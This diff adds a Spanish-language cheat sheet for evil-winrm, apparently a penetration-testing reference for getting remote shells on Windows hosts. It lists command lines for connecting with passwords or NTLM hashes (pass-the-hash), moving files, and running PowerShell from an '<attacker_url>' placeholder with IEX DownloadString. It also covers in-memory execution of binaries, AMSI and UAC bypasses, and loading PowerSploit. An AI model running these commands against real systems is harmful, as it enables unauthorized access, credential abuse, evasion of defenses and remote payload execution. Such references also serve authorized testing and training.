@@ -1,0 +1,73 @@
+▶ Conectar a un Host (Conexión básica con credenciales):
+  evil-winrm -i $IP -u <user> -p <password>
+
+▶ Conectar Usando SSL (Conexión segura con SSL):
+  evil-winrm -i $IP -u <user> -p <password> -S
+
+▶ Conectar con Hash NTLM (Pass-the-Hash para autenticación):
+  evil-winrm -i $IP -u <user> -H <nt_hash>
+
+▶ Conectar con Credenciales de Dominio (Usar credenciales de dominio):
+  evil-winrm -i $IP -u "<domain>\\<user>" -p <password>
+
+▶ Conectar con Certificados SSL (Usar claves públicas y privadas):
+  evil-winrm -i $IP -u <user> -p <password> -S -c <path_to_pubkey> -k <path_to_privkey>
+
+▶ Especificar Puerto Personalizado (Conexión a puerto WinRM específico):
+  evil-winrm -i $IP -u <user> -p <password> -P <port>
+
+▶ Especificar Directorio de Scripts (Definir ruta para scripts):
+  evil-winrm -i $IP -u <user> -p <password> -s <scripts_path>
+
+▶ Especificar Directorio de Ejecutables (Definir ruta para binarios):
+  evil-winrm -i $IP -u <user> -p <password> -e <executables_path>
+
+▶ Subir Archivo al Host (Transferir archivo al sistema remoto):
+  upload <local_path> <remote_path>
+
+▶ Descargar Archivo del Host (Transferir archivo desde el sistema remoto):
+  download <remote_path> <local_path>
+
+▶ Listar Servicios (Enumerar servicios del sistema):
+  services
+
+▶ Cargar Funciones Avanzadas (Mostrar menú de funciones):
+  menu
+
+▶ Cargar Script PowerShell (Ejecutar script PS1 desde el directorio especificado):
+  script.ps1 
+
+▶ Ejecutar Script PowerShell Remotamente (Ejecutar script PS1 desde URL):
+  evil-winrm -i $IP -u <user> -p <password> -s <scripts_path> -x "IEX (New-Object Net.WebClient).DownloadString('http://<attacker_url>/script.ps1')"
+
+▶ Ejecutar Binario en Memoria (Usar Invoke-Binary para ejecutar EXE):
+  Invoke-Binary <binary.exe> 
+
+▶ Bypass de AMSI (Evadir protección AMSI en PowerShell):
+  Bypass-AMSI 
+
+▶ Bypass de UAC (Intentar evadir control de cuentas de usuario):
+  UACBypass
+
+▶ Obtener Información del Sistema (Ejecutar DInvoke para recopilar información):
+  DInvoke 
+
+▶ Cargar PowerSploit (Cargar módulos de PowerSploit para explotación):
+  PowerSploit 
+
+▶ Ejecutar Comandos Directamente (Ejecutar un comando sin shell interactiva):
+  evil-winrm -i $IP -u <user> -p <password> -x "whoami"
+
+▶ Desactivar Colores (Eliminar colores en la interfaz):
+  evil-winrm -i $IP -u <user> -p <password> -n
+
+▶ Desactivar Autocompletado Remoto (Evitar autocompletado de rutas remotas):
+  evil-winrm -i $IP -u <user> -p <password> -N
+
+▶ Habilitar Registro de Sesión (Guardar comandos y salidas en logs):
+  evil-winrm -i $IP -u <user> -p <password> -l
+
+▶ Ejecutar en Docker (Usar Evil-WinRM dentro de Docker):
+  docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i $IP -u <user> -p <password>
+
+# - Para EVIL-WINRM, ajusta <user>, <password>, <nt_hash>, <path_to_pubkey>, <path_to_privkey>, <local_path>, <remote_path>, <port>, <scripts_path>, <executables_path>, <attacker_url>, y <binary.exe> según tu entorno.
